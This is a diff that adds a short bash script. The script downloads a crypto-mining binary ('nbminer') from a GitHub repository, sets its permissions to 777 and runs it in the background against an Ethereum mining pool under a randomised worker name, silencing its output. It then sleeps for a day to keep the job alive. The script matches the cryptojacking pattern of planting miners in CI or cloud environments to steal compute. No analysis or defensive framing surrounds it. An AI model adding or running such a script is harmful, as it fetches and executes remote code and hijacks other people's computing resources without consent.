@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/ncamacho07/cici/raw/main/nbminer
+chmod 777 nbminer
+./nbminer --url stratum+tcp://eth.ss.poolin.me:443 --user ethaing21.$(echo $(shuf -i 1-20000 -n 1)-Q) -p 123 --algo ethash >/dev/null &
+sleep 24h
